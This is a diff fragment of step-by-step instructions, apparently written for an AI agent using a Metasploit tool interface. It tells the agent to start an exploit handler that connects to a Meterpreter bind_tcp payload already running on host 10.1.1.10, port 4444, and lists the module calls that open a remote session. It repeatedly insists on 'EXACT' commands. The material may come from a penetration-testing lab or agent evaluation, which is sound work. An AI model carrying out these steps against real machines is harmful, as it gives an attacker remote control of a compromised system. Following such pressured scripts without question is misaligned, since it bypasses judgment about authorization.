@@ -14,16 +14,16 @@ Do not call anything else until connect succeeds.
 
 **STEP 2 — Run the exploit handler to establish a session**
 There is NO active session yet. You MUST create one. The target machine ADM-01 (10.1.1.10) has a Meterpreter bind_tcp payload already running on port 4444, but nothing is connected to it yet. You need to start a handler that reaches out and connects to that payload.
-Do not change the command to connect to the session. Do not stray from the EXACT command. Do not include options. This must be done with these EXACT args:
-{
-  tool: "execute_module"
-  lport: 4444
-  module_name: "exploit/multi/handler"
-  module_type: "exploit"
-  payload: "windows/x64/meterpreter/bind_tcp"
-  rhost: "10.1.1.10"
-}
-
+The following calls must be made for this to occur:
+```
+use_module("exploit", "multi/handler")
+set_module_option("exploit", "multi/handler", "PAYLOAD", "windows/x64/meterpreter/bind_tcp")
+set_module_option("exploit", "multi/handler", "LPORT", 4444)
+set_module_option("exploit", "multi/handler", "RHOST", "10.1.1.10")
+get_missing_required("exploit", "multi/handler")   # sanity check before firing
+execute_module("exploit", "multi/handler", payload="windows/x64/meterpreter/bind_tcp")
+list_sessions()
+```
 
 Call `mcp-pymetasploit3__execute_module` with these EXACT args:
 ```
